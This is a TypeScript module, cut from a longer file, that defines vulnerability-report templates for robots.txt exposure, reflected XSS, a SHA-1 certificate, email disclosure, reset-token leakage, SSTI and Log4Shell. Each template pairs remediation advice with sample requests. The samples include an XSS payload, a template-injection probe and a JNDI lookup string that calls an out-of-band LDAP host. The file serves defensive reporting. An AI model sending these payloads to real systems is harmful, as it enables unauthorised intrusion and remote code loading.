    cwe: 'CWE-200',
    location: 'GET /robots.txt',
    description:
      'robots.txt lists unlinked paths such as /wp-admin-old/ and /staging-preview/, which points attackers at interesting areas.',
    remediation:
      'Do not rely on robots.txt to hide content. Protect sensitive paths with authentication and remove stale ones.',
    evidence: (h) => ({
      request: `GET /robots.txt HTTP/1.1\nHost: ${h}`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/plain\n\nUser-agent: *\nDisallow: /wp-admin-old/\nDisallow: /staging-preview/`,
    }),
  },
  {
    key: 'xss-contact',
    title: 'Reflected XSS in contact form confirmation',
    severity: 'medium',
    category: 'A03: Injection',
    cwe: 'CWE-79',
    location: 'POST /contact',
    description: 'The confirmation page echoes the submitted name without encoding.',
    remediation: 'Encode the name on output and turn on the framework auto-escaping for this template.',
    evidence: (h) => ({
      request: `POST /contact HTTP/1.1\nHost: ${h}\nContent-Type: application/x-www-form-urlencoded\n\nname=%3Csvg/onload=alert(1)%3E&msg=hi`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n<p>Thanks, <svg/onload=alert(1)>! We will be in touch.</p>`,
    }),
  },
  {
    key: 'tls-cert',
    title: 'Certificate chain uses a SHA-1 signature',
    severity: 'medium',
    category: 'A02: Cryptographic Failures',
    cwe: 'CWE-327',
    location: 'TLS :443',
    description:
      'The served certificate chain includes an intermediate signed with SHA-1, which browsers distrust and which is open to collision attacks.',
    remediation: 'Reissue the certificate with a SHA-256 chain from the CA.',
    evidence: (h) => ({
      request: `openssl s_client -connect ${h}:443 -showcerts`,
      response: `depth=1 CN = Example Legacy CA\n  Signature Algorithm: sha1WithRSAEncryption\nverify return:1`,
    }),
  },
  {
    key: 'email-disclosure',
    title: 'Staff email addresses exposed in page source',
    severity: 'info',
    category: 'A05: Security Misconfiguration',
    cwe: 'CWE-200',
    location: 'GET /about',
    description: 'HTML comments list staff email addresses, which feed phishing and password-spraying lists.',
    remediation: 'Strip developer comments from production HTML in the build step.',
    evidence: (h) => ({
      request: `GET /about HTTP/1.1\nHost: ${h}`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n<!-- TODO ask j.morgan@example.com and it-admin@example.com about new hero -->`,
    }),
  },
  {
    key: 'reset-token-url',
    title: 'Password reset token leaked through Referer',
    severity: 'medium',
    category: 'A04: Insecure Design',
    cwe: 'CWE-598',
    location: 'GET /reset?token=',
    description:
      'The reset page loads third-party analytics, and the reset token in the query string leaks to that provider through the Referer header.',
    remediation:
      'Exchange the token for a short-lived session on first load, then redirect to a clean URL. Set Referrer-Policy: no-referrer.',
    evidence: (h) => ({
      request: `GET https://analytics.example/collect HTTP/1.1\nReferer: https://${h}/reset?token=9b1f6c0e2d7a4b38`,
      response: `HTTP/1.1 204 No Content`,
    }),
  },
  {
    key: 'ssti-search',
    title: 'Server-side template injection in docs search',
    severity: 'high',
    category: 'A03: Injection',
    cwe: 'CWE-1336',
    location: 'GET /search?q=',
    description:
      'The search query is rendered as a template. {{7*7}} evaluates to 49, and further payloads can reach the template engine runtime.',
    remediation:
      'Pass user input as template data, never as template source. Use a sandboxed template environment.',
    evidence: (h) => ({
      request: `GET /search?q=%7B%7B7*7%7D%7D HTTP/1.1\nHost: ${h}`,
      response: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n<h2>Results for 49</h2>`,
    }),
  },
  {
    key: 'log4shell',
    title: 'Log4Shell (CVE-2021-44228) in search backend',
    severity: 'critical',
    category: 'A06: Vulnerable and Outdated Components',
    cwe: 'CWE-917',
    location: 'GET /api/search (User-Agent)',
    description:
      'A JNDI lookup string in the User-Agent header triggered an outbound LDAP request from the search service, which runs Log4j 2.14.1.',
    remediation:
      'Upgrade Log4j to 2.17.1 or later, remove the JndiLookup class from older jars, and block outbound LDAP from application hosts.',
    evidence: (h) => ({
      request: `GET /api/search?q=auth HTTP/1.1\nHost: ${h}\nUser-Agent: \${jndi:ldap://a91c.oob.clearsite.example/x}`,
      response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"results":[]}\n\n# out-of-band LDAP callback received from 10.30.1.8`,
    }),
  },
]

export function vuln(key: string): VulnTemplate {
  const found = VULNS.find((v) => v.key === key)
  if (!found) throw new Error(`Unknown vulnerability template: ${key}`)
  return found
}
